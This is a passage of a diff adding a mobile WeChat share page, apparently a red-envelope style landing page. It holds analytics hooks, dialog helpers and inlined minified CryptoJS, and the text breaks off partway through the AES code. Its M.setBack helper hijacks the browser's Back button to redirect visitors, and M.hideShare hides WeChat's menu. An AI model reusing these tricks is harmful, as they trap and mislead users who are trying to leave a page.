@@ -1,0 +1,1133 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="utf-8">
+  <title></title>
+  <meta name="viewport"
+    content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=0,viewport-fit=cover" />
+  <meta name="format-detection" content="telephone=no">
+  <meta name="applicable-device" content="mobile">
+  <link rel="stylesheet" href="https://lifescore.oss-cn-qingdao.aliyuncs.com/hb_v2/css/s.css" />
+</head>
+
+<body class="share-body">
+  <img class="js_head_img js_hide" data-src="https://lifescore.oss-cn-qingdao.aliyuncs.com/hb_v2/image/hb3.png?v1">
+  <script>
+    window.define = null;
+    window.focusLocation = {};
+  </script>
+
+  <script src="http://cb.cdn.changbaimg.com/js/jquery-1.8.0.js"></script>
+  <script src="//res.wx.qq.com/open/js/jweixin-1.0.0.js"></script>
+  <script>
+    (function () {
+      window["M"] = window["M"] || {};
+      M.loadJS = function (src, callback, errCallback) {
+        if (!src) {
+          return
+        }
+        var e = document.createElement("script");
+        e.setAttribute("type", "text/javascript");
+        e.setAttribute("charset", "utf-8");
+        e.setAttribute("src", src);
+        document.getElementsByTagName("head")[0].appendChild(e);
+        if (typeof errCallback === "function") {
+          e.onerror = errCallback
+        }
+        e.onload = function () {
+          if (typeof callback === "function") {
+            callback()
+          }
+        }
+      };
+      M.report = function (id) {
+        if (!id) {
+          return false
+        }
+        window["_hmt"] = window["_hmt"] || [];
+        var hm = document.createElement("script");
+        hm.src = "https://hm.baidu.com/hm.js?" + id;
+        var s = document.getElementsByTagName("script")[0];
+        s.parentNode.insertBefore(hm, s);
+        setTimeout(function () {
+          try {
+            $(document.body).on("event_page_share_message", function () {
+              M.hotClick("share.message")
+            });
+            $(document.body).on("event_page_share_timeline", function () {
+              M.hotClick("share.timeline")
+            })
+          } catch (e) {}
+        });
+        setTimeout(function () {
+          var sfrom = M.getParam("sfrom");
+          if (sfrom === "shareGroup") {
+            M.hotClick("pv.shareGroup." + location.pathname)
+          } else if (sfrom === "shareTimeLine") {
+            M.hotClick("pv.shareTimeLine." + location.pathname)
+          } else {
+            M.hotClick("pv.default." + location.pathname)
+          }
+        })
+      };
+      M.decode = function (str) {
+        return decodeURIComponent(atob(str).split("").map(function (c) {
+          return "%" + ("00" + c.charCodeAt(0).toString(16)).slice(-2)
+        }).join(""))
+      };
+      M.hideShare = function () {
+        function hide() {
+          try {
+            wx.hideOptionMenu();
+            wx.hideAllNonBaseMenuItem()
+          } catch (e) {}
+        }
+        try {
+          wx.config({
+            jsApiList: ["hideOptionMenu", "hideAllNonBaseMenuItem"]
+          });
+          wx.ready(function () {
+            console.log("ready");
+            hide()
+          })
+        } catch (e) {}
+      };
+      M.setBack = function (backUrl) {
+        if (!backUrl) {
+          return false
+        }
+        var fn = arguments.callee;
+        if (fn.hasInit) {
+          return false
+        }
+        fn.hasInit = true;
+        setTimeout(function () {
+          history.pushState(history.length + 1, "back", location.href + "#" + (new Date).getTime())
+        }, 100);
+        window.onhashchange = function () {
+          location.href = backUrl
+        }
+      };
+      M.playVideo = function (vid, domId) {
+        var $box = $("#" + domId);
+        var video = new tvp.VideoInfo;
+        video.setVid(vid);
+        var player = new tvp.Player($box.width(), $box.height());
+        player.setCurVideo(video);
+        player.addParam("wmode", "transparent");
+        player.addParam("pic", tvp.common.getVideoSnapMobile(vid));
+        player.write(domId);
+        return player
+      };
+      M.getParam = function (name, url) {
+        var r = new RegExp("(\\?|#|&)" + name + "=(.*?)(#|&|$)");
+        var m = (url || location.href).match(r);
+        return m ? m[2] : ""
+      };
+      M.addParam = function (url, obj) {
+        var p = M.param(obj);
+        if (!/\?/.test(url) && !/#/.test(url)) {
+          url = url + "?" + p
+        } else if (/\?/.test(url) && !/#/.test(url)) {
+          url = url + "&" + p
+        } else if (!/\?/.test(url) && /#/.test(url)) {
+          url = url.replace("#", "?" + p + "#")
+        } else {
+          url = url.replace("?", "?" + p + "&")
+        }
+        return url
+      };
+      M.addHash = function (url, obj) {
+        var p = M.param(obj);
+        if (!/#/.test(url)) {
+          url = url + "#" + p
+        } else {
+          url = url.replace("#", "#" + p + "&")
+        }
+        return url
+      };
+      M.param = function (obj) {
+        if (typeof obj !== "object") {
+          return
+        }
+        var p = [];
+        for (var i in obj) {
+          p.push(encodeURIComponent(i) + "=" + encodeURIComponent(obj[i]))
+        }
+        return p.join("&")
+      };
+      M.wxAlert = function (param) {
+        param = $.extend({
+          bgUrl: "//xian10.oss-cn-hangzhou.aliyuncs.com/images/ff.png",
+          msg: "温馨提示",
+          btn: "确定"
+        }, param);
+        $("#fenxiang").attr("src", param.bgUrl).show();
+        if ($("#lly_dialog").length === 0) {
+          var dialog = decodeURIComponent(
+            "%3Cdiv%20id%3D%22lly_dialog%22%3E%0A%20%20%20%20%3Cdiv%20class%3D%22weui-mask%22%3E%3C%2Fdiv%3E%0A%20%20%20%20%3Cdiv%20class%3D%22weui-dialog%22%3E%0A%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%22weui-dialog__bd%22%20id%3D%22lly_dialog_msg%22%3E%3C%2Fdiv%3E%0A%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%22weui-dialog__ft%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%3Ca%20href%3D%22javascript%3A%3B%22%20class%3D%22weui-dialog__btn%20weui-dialog__btn_primary%22%20id%3D%22lly_dialog_btn%22%3E%3C%2Fa%3E%0A%20%20%20%20%20%20%20%20%3C%2Fdiv%3E%0A%20%20%20%20%3C%2Fdiv%3E%0A%3C%2Fdiv%3E"
+            );
+          $(document.body).append(dialog)
+        }
+        var d = $("#lly_dialog");
+        d.show(200);
+        d.find("#lly_dialog_msg").html(param.msg);
+        d.find("#lly_dialog_btn").html(param.btn);
+        d.find("#lly_dialog_btn").off("click").on("click", function () {
+          d.hide(200);
+          if (typeof param.cb === "function") {
+            param.cb()
+          }
+        })
+      };
+      M.doPv = function (url) {
+        if (typeof _hmt === "object" && typeof _hmt.push === "function") {
+          _hmt.push(["_trackPageview", url])
+        }
+      };
+      M.hotClick = function (str) {
+        if (typeof _hmt === "object" && typeof _hmt.push === "function") {
+          var param = ["_trackEvent", "e"].concat(str.split(".").slice(0, 3));
+          _hmt.push(param)
+        }
+      };
+      M.log = function (str) {
+        var tips = "";
+        var type = typeof str;
+        switch (type) {
+          case "string":
+          case "number":
+          case "boolean":
+            tips = str;
+            break;
+          case "undefined":
+            tips = "undefined";
+            break;
+          case "object":
+            if (str.message) {
+              tips = str.message
+            } else {
+              tips = JSON.stringify(str)
+            }
+            break;
+          default:
+            tips = str.toString()
+        }
+        if (console && console.log) {
+          console.log(tips)
+        }
+      };
+      M.loadImages = function (imageList, timeOut, cb) {
+        function doCb() {
+          var fn = arguments.callee;
+          if (fn.hasInit) {
+            return false
+          }
+          fn.hasInit = true;
+          if (typeof cb === "function") {
+            cb()
+          }
+        }
+
+        function checkDone() {
+          if (length === onloadNumber) {
+            clearTimeout(timer);
+            doCb()
+          }
+        }
+        if (imageList.length === 0) {
+          doCb();
+          return false
+        }
+        var timer = setTimeout(doCb, timeOut * 1e3);
+        var length = imageList.length;
+        var onloadNumber = 0;
+        for (var i = 0; i < length; i++) {
+          var tempImage = new Image;
+          tempImage.onload = function () {
+            onloadNumber++;
+            checkDone()
+          };
+          tempImage.onerror = function () {
+            onloadNumber++;
+            checkDone()
+          };
+          console.log(imageList[i]);
+          tempImage.src = imageList[i]
+        }
+      };
+      M.resetFont = function () {
+        function setFont() {
+          var clientWidth = document.documentElement.clientWidth;
+          document.documentElement.style.fontSize = parseFloat(clientWidth / 3.75) + "px"
+        }
+        window.addEventListener("orientationchange" in window ? "orientationchange" : "resize", setFont, false);
+        document.addEventListener("DOMContentLoaded", setFont, false);
+        setTimeout(setFont, 100)
+      }
+    })();
+    (function () {
+      String.prototype.jstpl_format = function (ns) {
+        function fn(w, g) {
+          if (g in ns) {
+            return ns[g]
+          } else {
+            return ""
+          }
+        }
+        return this.replace(/%\(([A-Za-z0-9_|.]+)\)/g, fn)
+      };
+      var config = {
+        tpl: {
+          _alerttpl: ['<div id="js_mod_dialog" class="mod-popup %(popupClass)">', '  <div class="popup-body">',
+            '    <h3 class="popup-title">%(title)</h3>', '    <div class="popup-cont">%(message)</div>',
+            '    <div class="popup-btn">%(btnhtml)</div>', "  </div>", "</div>"
+          ].join("")
+        }
+      };
+      var hasInsetCSS = false;
+      var g_js_dialogCb = null;
+      var g_js_cancel_dialogCb = null;
+      window.g_js_dialog = function (type) {
+        close();
+        if (typeof g_js_dialogCb === "function") {
+          g_js_dialogCb(type)
+        }
+      };
+      window.g_js_cancel_dialog = function (type) {
+        close();
+        if (typeof g_js_cancel_dialogCb === "function") {
+          g_js_cancel_dialogCb(type)
+        }
+      };
+
+      function __insetCss() {
+        hasInsetCSS = true;
+        var text =
+          ".mod-popup{z-index:10000;width:100%;position:absolute;top:0;left:0;height:100%;background:rgba(0,0,0,.5)}.popup-body{position:absolute;width:3rem;margin-top:1.25rem;border-radius:6px;background:#fff;left:50%;margin-left:-1.5rem}.popup-body .popup-title{color:#000;font-size:.2rem;margin-top:.2rem;text-align:center}.popup-body .popup-cont{padding:.12rem .24rem .2rem;font-size:.16rem;color:rgba(0,0,0,.54);text-align:center}.popup-body .popup-btn{width:100%;border-top:1px solid rgba(0,0,0,.08);font-size:0}.double-btn-popup .popup-btn a{display:inline-block;width:50%;color:#009688;font-weight:700;text-align:center;font-size:.18rem;-webkit-box-sizing:border-box;-moz-box-sizing:border-box;box-sizing:border-box;padding:.16rem 0}.double-btn-popup .popup-btn a+a{border-left:1px solid rgba(0,0,0,.08)}.single-btn-popup a{display:block;width:100%;color:#009688;font-weight:700;text-align:center;font-size:.18rem;padding:.16rem 0}";
+        var s = document.createElement("style");
+        s.innerHTML = text;
+        document.head.appendChild(s);
+        s = null
+      }
+
+      function close() {
+        var d = document.getElementById("js_mod_dialog");
+        if (d) {
+          document.body.removeChild(d);
+          d = null
+        }
+      }
+
+      function alert(p) {
+        if (!hasInsetCSS) {
+          __insetCss()
+        }
+        close();
+        g_js_dialogCb = null;
+        var opt = {
+          title: "温馨提示",
+          message: "",
+          btn: "知道了",
+          cb: null
+        };
+        if (typeof p === "string") {
+          opt.message = p
+        } else if (typeof p === "object") {
+          opt = $.extend(opt, p)
+        } else {
+          opt.message = typeof p;
+          if (opt.message === "boolean") {
+            if (p) {
+              opt.message = "true"
+            } else {
+              opt.message = "false"
+            }
+          }
+        }
+        opt.btnhtml = '<a class="js_global_dialog_submit_btn" href="javascript:;" data-value="0"><span>' + opt.btn +
+          "</span></a>";
+        opt.popupClass = makePopupType(opt);
+        var html = config.tpl._alerttpl.jstpl_format(opt);
+        g_js_dialogCb = opt.cb;
+        setTimeout(function () {
+          document.body.insertAdjacentHTML("beforeEnd", html)
+        }, 200)
+      }
+
+      function makePopupType(opt) {
+        var type = "single-btn-popup";
+        if (opt && opt.btn && typeof opt.btn !== "string" && opt.btn.length > 1 && typeof opt.btn.push ===
+          "function") {
+          type = "double-btn-popup"
+        }
+        return type
+      }
+
+      function confirm(p) {
+        if (!hasInsetCSS) {
+          __insetCss()
+        }
+        close();
+        g_js_dialogCb = null;
+        g_js_cancel_dialogCb = null;
+        var opt = {
+          title: "温馨提示",
+          message: "",
+          btn: ["取消", "确定"],
+          cb: null,
+          cancelCb: null,
+          href: ""
+        };
+        if (typeof p === "string") {
+          opt.message = p
+        } else if (typeof p === "object") {
+          opt = $.extend(opt, p)
+        } else {
+          return
+        }
+        opt.btnhtml = '<a class="js_global_dialog_cancel_btn" href="javascript:;"><span>' + opt.btn[0] +
+        "</span></a>";
+        opt.btnhtml += '<a class="' + (opt.href ? "" : "js_global_dialog_submit_btn") + '" href="' + (opt.href ? opt
+          .href : "javascript:;") + '" data-value="1"><span>' + opt.btn[1] + "</span></a>";
+        opt.popupClass = makePopupType(opt);
+        var html = config.tpl._alerttpl.jstpl_format(opt);
+        g_js_dialogCb = opt.cb;
+        g_js_cancel_dialogCb = opt.cancelCb;
+        setTimeout(function () {
+          document.body.insertAdjacentHTML("beforeEnd", html)
+        }, 200)
+      }
+      window.g_dialog = {
+        close: close,
+        alert: alert,
+        confirm: confirm
+      };
+      $(function () {
+        document.body.onclick = function () {};
+        $(document.body).on("click", ".js_global_dialog_cancel_btn", function (event) {
+          event.preventDefault();
+          g_js_cancel_dialog(0);
+          return false
+        });
+        $(document.body).on("click", ".js_global_dialog_submit_btn", function (event) {
+          event.preventDefault();
+          var $this = $(this);
+          var value = parseInt($this.attr("data-value"));
+          g_js_dialog(value);
+          return false
+        })
+      })
+    })();
+  </script>
+  <script>
+  !function(t,n){"object"==typeof exports?module.exports=exports=n():"function"==typeof define&&define.amd?define([],n):t.CryptoJS=n()}(this,function(){var t=t||function(t,n){var i=Object.create||function(){function t(){}return function(n){var i;return t.prototype=n,i=new t,t.prototype=null,i}}(),e={},r=e.lib={},o=r.Base=function(){return{extend:function(t){var n=i(this);return t&&n.mixIn(t),n.hasOwnProperty("init")&&this.init!==n.init||(n.init=function(){n.$super.init.apply(this,arguments)}),n.init.prototype=n,n.$super=this,n},create:function(){var t=this.extend();return t.init.apply(t,arguments),t},init:function(){},mixIn:function(t){for(var n in t)t.hasOwnProperty(n)&&(this[n]=t[n]);t.hasOwnProperty("toString")&&(this.toString=t.toString)},clone:function(){return this.init.prototype.extend(this)}}}(),s=r.WordArray=o.extend({init:function(t,i){t=this.words=t||[],i!=n?this.sigBytes=i:this.sigBytes=4*t.length},toString:function(t){return(t||c).stringify(this)},concat:function(t){var n=this.words,i=t.words,e=this.sigBytes,r=t.sigBytes;if(this.clamp(),e%4)for(var o=0;o<r;o++){var s=i[o>>>2]>>>24-o%4*8&255;n[e+o>>>2]|=s<<24-(e+o)%4*8}else for(var o=0;o<r;o+=4)n[e+o>>>2]=i[o>>>2];return this.sigBytes+=r,this},clamp:function(){var n=this.words,i=this.sigBytes;n[i>>>2]&=4294967295<<32-i%4*8,n.length=t.ceil(i/4)},clone:function(){var t=o.clone.call(this);return t.words=this.words.slice(0),t},random:function(n){for(var i,e=[],r=function(n){var n=n,i=987654321,e=4294967295;return function(){i=36969*(65535&i)+(i>>16)&e,n=18e3*(65535&n)+(n>>16)&e;var r=(i<<16)+n&e;return r/=4294967296,r+=.5,r*(t.random()>.5?1:-1)}},o=0;o<n;o+=4){var a=r(4294967296*(i||t.random()));i=987654071*a(),e.push(4294967296*a()|0)}return new s.init(e,n)}}),a=e.enc={},c=a.Hex={stringify:function(t){for(var n=t.words,i=t.sigBytes,e=[],r=0;r<i;r++){var o=n[r>>>2]>>>24-r%4*8&255;e.push((o>>>4).toString(16)),e.push((15&o).toString(16))}return e.join("")},parse:function(t){for(var n=t.length,i=[],e=0;e<n;e+=2)i[e>>>3]|=parseInt(t.substr(e,2),16)<<24-e%8*4;return new s.init(i,n/2)}},u=a.Latin1={stringify:function(t){for(var n=t.words,i=t.sigBytes,e=[],r=0;r<i;r++){var o=n[r>>>2]>>>24-r%4*8&255;e.push(String.fromCharCode(o))}return e.join("")},parse:function(t){for(var n=t.length,i=[],e=0;e<n;e++)i[e>>>2]|=(255&t.charCodeAt(e))<<24-e%4*8;return new s.init(i,n)}},f=a.Utf8={stringify:function(t){try{return decodeURIComponent(escape(u.stringify(t)))}catch(t){throw new Error("Malformed UTF-8 data")}},parse:function(t){return u.parse(unescape(encodeURIComponent(t)))}},h=r.BufferedBlockAlgorithm=o.extend({reset:function(){this._data=new s.init,this._nDataBytes=0},_append:function(t){"string"==typeof t&&(t=f.parse(t)),this._data.concat(t),this._nDataBytes+=t.sigBytes},_process:function(n){var i=this._data,e=i.words,r=i.sigBytes,o=this.blockSize,a=4*o,c=r/a;c=n?t.ceil(c):t.max((0|c)-this._minBufferSize,0);var u=c*o,f=t.min(4*u,r);if(u){for(var h=0;h<u;h+=o)this._doProcessBlock(e,h);var p=e.splice(0,u);i.sigBytes-=f}return new s.init(p,f)},clone:function(){var t=o.clone.call(this);return t._data=this._data.clone(),t},_minBufferSize:0}),p=(r.Hasher=h.extend({cfg:o.extend(),init:function(t){this.cfg=this.cfg.extend(t),this.reset()},reset:function(){h.reset.call(this),this._doReset()},update:function(t){return this._append(t),this._process(),this},finalize:function(t){t&&this._append(t);var n=this._doFinalize();return n},blockSize:16,_createHelper:function(t){return function(n,i){return new t.init(i).finalize(n)}},_createHmacHelper:function(t){return function(n,i){return new p.HMAC.init(t,i).finalize(n)}}}),e.algo={});return e}(Math);return t});
+//# sourceMappingURL=core.min.js.map
+!function(r,e){"object"==typeof exports?module.exports=exports=e(require("./core.min")):"function"==typeof define&&define.amd?define(["./core.min"],e):e(r.CryptoJS)}(this,function(r){return function(){function e(r,e,t){for(var n=[],i=0,o=0;o<e;o++)if(o%4){var f=t[r.charCodeAt(o-1)]<<o%4*2,c=t[r.charCodeAt(o)]>>>6-o%4*2;n[i>>>2]|=(f|c)<<24-i%4*8,i++}return a.create(n,i)}var t=r,n=t.lib,a=n.WordArray,i=t.enc;i.Base64={stringify:function(r){var e=r.words,t=r.sigBytes,n=this._map;r.clamp();for(var a=[],i=0;i<t;i+=3)for(var o=e[i>>>2]>>>24-i%4*8&255,f=e[i+1>>>2]>>>24-(i+1)%4*8&255,c=e[i+2>>>2]>>>24-(i+2)%4*8&255,s=o<<16|f<<8|c,h=0;h<4&&i+.75*h<t;h++)a.push(n.charAt(s>>>6*(3-h)&63));var p=n.charAt(64);if(p)for(;a.length%4;)a.push(p);return a.join("")},parse:function(r){var t=r.length,n=this._map,a=this._reverseMap;if(!a){a=this._reverseMap=[];for(var i=0;i<n.length;i++)a[n.charCodeAt(i)]=i}var o=n.charAt(64);if(o){var f=r.indexOf(o);f!==-1&&(t=f)}return e(r,t,a)},_map:"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/="}}(),r.enc.Base64});
+//# sourceMappingURL=enc-base64.min.js.map
+!function(r,e){"object"==typeof exports?module.exports=exports=e(require("./core.min")):"function"==typeof define&&define.amd?define(["./core.min"],e):e(r.CryptoJS)}(this,function(r){return function(e){function n(r,e,n,t,o,a,i){var s=r+(e&n|~e&t)+o+i;return(s<<a|s>>>32-a)+e}function t(r,e,n,t,o,a,i){var s=r+(e&t|n&~t)+o+i;return(s<<a|s>>>32-a)+e}function o(r,e,n,t,o,a,i){var s=r+(e^n^t)+o+i;return(s<<a|s>>>32-a)+e}function a(r,e,n,t,o,a,i){var s=r+(n^(e|~t))+o+i;return(s<<a|s>>>32-a)+e}var i=r,s=i.lib,c=s.WordArray,f=s.Hasher,h=i.algo,u=[];!function(){for(var r=0;r<64;r++)u[r]=4294967296*e.abs(e.sin(r+1))|0}();var v=h.MD5=f.extend({_doReset:function(){this._hash=new c.init([1732584193,4023233417,2562383102,271733878])},_doProcessBlock:function(r,e){for(var i=0;i<16;i++){var s=e+i,c=r[s];r[s]=16711935&(c<<8|c>>>24)|4278255360&(c<<24|c>>>8)}var f=this._hash.words,h=r[e+0],v=r[e+1],d=r[e+2],l=r[e+3],_=r[e+4],p=r[e+5],y=r[e+6],m=r[e+7],D=r[e+8],H=r[e+9],M=r[e+10],g=r[e+11],w=r[e+12],x=r[e+13],B=r[e+14],b=r[e+15],j=f[0],k=f[1],q=f[2],z=f[3];j=n(j,k,q,z,h,7,u[0]),z=n(z,j,k,q,v,12,u[1]),q=n(q,z,j,k,d,17,u[2]),k=n(k,q,z,j,l,22,u[3]),j=n(j,k,q,z,_,7,u[4]),z=n(z,j,k,q,p,12,u[5]),q=n(q,z,j,k,y,17,u[6]),k=n(k,q,z,j,m,22,u[7]),j=n(j,k,q,z,D,7,u[8]),z=n(z,j,k,q,H,12,u[9]),q=n(q,z,j,k,M,17,u[10]),k=n(k,q,z,j,g,22,u[11]),j=n(j,k,q,z,w,7,u[12]),z=n(z,j,k,q,x,12,u[13]),q=n(q,z,j,k,B,17,u[14]),k=n(k,q,z,j,b,22,u[15]),j=t(j,k,q,z,v,5,u[16]),z=t(z,j,k,q,y,9,u[17]),q=t(q,z,j,k,g,14,u[18]),k=t(k,q,z,j,h,20,u[19]),j=t(j,k,q,z,p,5,u[20]),z=t(z,j,k,q,M,9,u[21]),q=t(q,z,j,k,b,14,u[22]),k=t(k,q,z,j,_,20,u[23]),j=t(j,k,q,z,H,5,u[24]),z=t(z,j,k,q,B,9,u[25]),q=t(q,z,j,k,l,14,u[26]),k=t(k,q,z,j,D,20,u[27]),j=t(j,k,q,z,x,5,u[28]),z=t(z,j,k,q,d,9,u[29]),q=t(q,z,j,k,m,14,u[30]),k=t(k,q,z,j,w,20,u[31]),j=o(j,k,q,z,p,4,u[32]),z=o(z,j,k,q,D,11,u[33]),q=o(q,z,j,k,g,16,u[34]),k=o(k,q,z,j,B,23,u[35]),j=o(j,k,q,z,v,4,u[36]),z=o(z,j,k,q,_,11,u[37]),q=o(q,z,j,k,m,16,u[38]),k=o(k,q,z,j,M,23,u[39]),j=o(j,k,q,z,x,4,u[40]),z=o(z,j,k,q,h,11,u[41]),q=o(q,z,j,k,l,16,u[42]),k=o(k,q,z,j,y,23,u[43]),j=o(j,k,q,z,H,4,u[44]),z=o(z,j,k,q,w,11,u[45]),q=o(q,z,j,k,b,16,u[46]),k=o(k,q,z,j,d,23,u[47]),j=a(j,k,q,z,h,6,u[48]),z=a(z,j,k,q,m,10,u[49]),q=a(q,z,j,k,B,15,u[50]),k=a(k,q,z,j,p,21,u[51]),j=a(j,k,q,z,w,6,u[52]),z=a(z,j,k,q,l,10,u[53]),q=a(q,z,j,k,M,15,u[54]),k=a(k,q,z,j,v,21,u[55]),j=a(j,k,q,z,D,6,u[56]),z=a(z,j,k,q,b,10,u[57]),q=a(q,z,j,k,y,15,u[58]),k=a(k,q,z,j,x,21,u[59]),j=a(j,k,q,z,_,6,u[60]),z=a(z,j,k,q,g,10,u[61]),q=a(q,z,j,k,d,15,u[62]),k=a(k,q,z,j,H,21,u[63]),f[0]=f[0]+j|0,f[1]=f[1]+k|0,f[2]=f[2]+q|0,f[3]=f[3]+z|0},_doFinalize:function(){var r=this._data,n=r.words,t=8*this._nDataBytes,o=8*r.sigBytes;n[o>>>5]|=128<<24-o%32;var a=e.floor(t/4294967296),i=t;n[(o+64>>>9<<4)+15]=16711935&(a<<8|a>>>24)|4278255360&(a<<24|a>>>8),n[(o+64>>>9<<4)+14]=16711935&(i<<8|i>>>24)|4278255360&(i<<24|i>>>8),r.sigBytes=4*(n.length+1),this._process();for(var s=this._hash,c=s.words,f=0;f<4;f++){var h=c[f];c[f]=16711935&(h<<8|h>>>24)|4278255360&(h<<24|h>>>8)}return s},clone:function(){var r=f.clone.call(this);return r._hash=this._hash.clone(),r}});i.MD5=f._createHelper(v),i.HmacMD5=f._createHmacHelper(v)}(Math),r.MD5});
+//# sourceMappingURL=md5.min.js.map
+!function(e,t,i){"object"==typeof exports?module.exports=exports=t(require("./core.min"),require("./sha1.min"),require("./hmac.min")):"function"==typeof define&&define.amd?define(["./core.min","./sha1.min","./hmac.min"],t):t(e.CryptoJS)}(this,function(e){return function(){var t=e,i=t.lib,r=i.Base,n=i.WordArray,o=t.algo,a=o.MD5,c=o.EvpKDF=r.extend({cfg:r.extend({keySize:4,hasher:a,iterations:1}),init:function(e){this.cfg=this.cfg.extend(e)},compute:function(e,t){for(var i=this.cfg,r=i.hasher.create(),o=n.create(),a=o.words,c=i.keySize,f=i.iterations;a.length<c;){s&&r.update(s);var s=r.update(e).finalize(t);r.reset();for(var u=1;u<f;u++)s=r.finalize(s),r.reset();o.concat(s)}return o.sigBytes=4*c,o}});t.EvpKDF=function(e,t,i){return c.create(i).compute(e,t)}}(),e.EvpKDF});
+//# sourceMappingURL=evpkdf.min.js.map
+!function(e,t){"object"==typeof exports?module.exports=exports=t(require("./core.min")):"function"==typeof define&&define.amd?define(["./core.min"],t):t(e.CryptoJS)}(this,function(e){e.lib.Cipher||function(t){var r=e,i=r.lib,n=i.Base,c=i.WordArray,o=i.BufferedBlockAlgorithm,s=r.enc,a=(s.Utf8,s.Base64),f=r.algo,p=f.EvpKDF,d=i.Cipher=o.extend({cfg:n.extend(),createEncryptor:function(e,t){return this.create(this._ENC_XFORM_MODE,e,t)},createDecryptor:function(e,t){return this.create(this._DEC_XFORM_MODE,e,t)},init:function(e,t,r){this.cfg=this.cfg.extend(r),this._xformMode=e,this._key=t,this.reset()},reset:function(){o.reset.call(this),this._doReset()},process:function(e){return this._append(e),this._process()},finalize:function(e){e&&this._append(e);var t=this._doFinalize();return t},keySize:4,ivSize:4,_ENC_XFORM_MODE:1,_DEC_XFORM_MODE:2,_createHelper:function(){function e(e){return"string"==typeof e?B:k}return function(t){return{encrypt:function(r,i,n){return e(i).encrypt(t,r,i,n)},decrypt:function(r,i,n){return e(i).decrypt(t,r,i,n)}}}}()}),h=(i.StreamCipher=d.extend({_doFinalize:function(){var e=this._process(!0);return e},blockSize:1}),r.mode={}),u=i.BlockCipherMode=n.extend({createEncryptor:function(e,t){return this.Encryptor.create(e,t)},createDecryptor:function(e,t){return this.Decryptor.create(e,t)},init:function(e,t){this._cipher=e,this._iv=t}}),l=h.CBC=function(){function e(e,r,i){var n=this._iv;if(n){var c=n;this._iv=t}else var c=this._prevBlock;for(var o=0;o<i;o++)e[r+o]^=c[o]}var r=u.extend();return r.Encryptor=r.extend({processBlock:function(t,r){var i=this._cipher,n=i.blockSize;e.call(this,t,r,n),i.encryptBlock(t,r),this._prevBlock=t.slice(r,r+n)}}),r.Decryptor=r.extend({processBlock:function(t,r){var i=this._cipher,n=i.blockSize,c=t.slice(r,r+n);i.decryptBlock(t,r),e.call(this,t,r,n),this._prevBlock=c}}),r}(),_=r.pad={},v=_.Pkcs7={pad:function(e,t){for(var r=4*t,i=r-e.sigBytes%r,n=i<<24|i<<16|i<<8|i,o=[],s=0;s<i;s+=4)o.push(n);var a=c.create(o,i);e.concat(a)},unpad:function(e){var t=255&e.words[e.sigBytes-1>>>2];e.sigBytes-=t}},y=(i.BlockCipher=d.extend({cfg:d.cfg.extend({mode:l,padding:v}),reset:function(){d.reset.call(this);var e=this.cfg,t=e.iv,r=e.mode;if(this._xformMode==this._ENC_XFORM_MODE)var i=r.createEncryptor;else{var i=r.createDecryptor;this._minBufferSize=1}this._mode=i.call(r,this,t&&t.words)},_doProcessBlock:function(e,t){this._mode.processBlock(e,t)},_doFinalize:function(){var e=this.cfg.padding;if(this._xformMode==this._ENC_XFORM_MODE){e.pad(this._data,this.blockSize);var t=this._process(!0)}else{var t=this._process(!0);e.unpad(t)}return t},blockSize:4}),i.CipherParams=n.extend({init:function(e){this.mixIn(e)},toString:function(e){return(e||this.formatter).stringify(this)}})),x=r.format={},g=x.OpenSSL={stringify:function(e){var t=e.ciphertext,r=e.salt;if(r)var i=c.create([1398893684,1701076831]).concat(r).concat(t);else var i=t;return i.toString(a)},parse:function(e){var t=a.parse(e),r=t.words;if(1398893684==r[0]&&1701076831==r[1]){var i=c.create(r.slice(2,4));r.splice(0,4),t.sigBytes-=16}return y.create({ciphertext:t,salt:i})}},k=i.SerializableCipher=n.extend({cfg:n.extend({format:g}),encrypt:function(e,t,r,i){i=this.cfg.extend(i);var n=e.createEncryptor(r,i),c=n.finalize(t),o=n.cfg;return y.create({ciphertext:c,key:r,iv:o.iv,algorithm:e,mode:o.mode,padding:o.padding,blockSize:e.blockSize,formatter:i.format})},decrypt:function(e,t,r,i){i=this.cfg.extend(i),t=this._parse(t,i.format);var n=e.createDecryptor(r,i).finalize(t.ciphertext);return n},_parse:function(e,t){return"string"==typeof e?t.parse(e,this):e}}),m=r.kdf={},S=m.OpenSSL={execute:function(e,t,r,i){i||(i=c.random(8));var n=p.create({keySize:t+r}).compute(e,i),o=c.create(n.words.slice(t),4*r);return n.sigBytes=4*t,y.create({key:n,iv:o,salt:i})}},B=i.PasswordBasedCipher=k.extend({cfg:k.cfg.extend({kdf:S}),encrypt:function(e,t,r,i){i=this.cfg.extend(i);var n=i.kdf.execute(r,e.keySize,e.ivSize);i.iv=n.iv;var c=k.encrypt.call(this,e,t,n.key,i);return c.mixIn(n),c},decrypt:function(e,t,r,i){i=this.cfg.extend(i),t=this._parse(t,i.format);var n=i.kdf.execute(r,e.keySize,e.ivSize,t.salt);i.iv=n.iv;var c=k.decrypt.call(this,e,t,n.key,i);return c}})}()});
+//# sourceMappingURL=cipher-core.min.js.map
+!function(e,r,i){"object"==typeof exports?module.exports=exports=r(require("./core"),require("./enc-base64"),require("./md5"),require("./evpkdf"),require("./cipher-core")):"function"==typeof define&&define.amd?define(["./core","./enc-base64","./md5","./evpkdf","./cipher-core"],r):r(e.CryptoJS)}(this,function(e){return function(){var r=e,i=r.lib,o=i.BlockCipher,t=r.algo,n=[],c=[],s=[],f=[],a=[],d=[],u=[],v=[],h=[],y=[];!function(){for(var e=[],r=0;r<256;r++)r<128?e[r]=r<<1:e[r]=r<<1^283;for(var i=0,o=0,r=0;r<256;r++){var t=o^o<<1^o<<2^o<<3^o<<4;t=t>>>8^255&t^99,n[i]=t,c[t]=i;var p=e[i],l=e[p],_=e[l],k=257*e[t]^16843008*t;s[i]=k<<24|k>>>8,f[i]=k<<16|k>>>16,a[i]=k<<8|k>>>24,d[i]=k;var k=16843009*_^65537*l^257*p^16843008*i;u[t]=k<<24|k>>>8,v[t]=k<<16|k>>>16,h[t]=k<<8|k>>>24,y[t]=k,i?(i=p^e[e[e[_^p]]],o^=e[e[o]]):i=o=1}}();var p=[0,1,2,4,8,16,32,64,128,27,54],l=t.AES=o.extend({_doReset:function(){if(!this._nRounds||this._keyPriorReset!==this._key){for(var 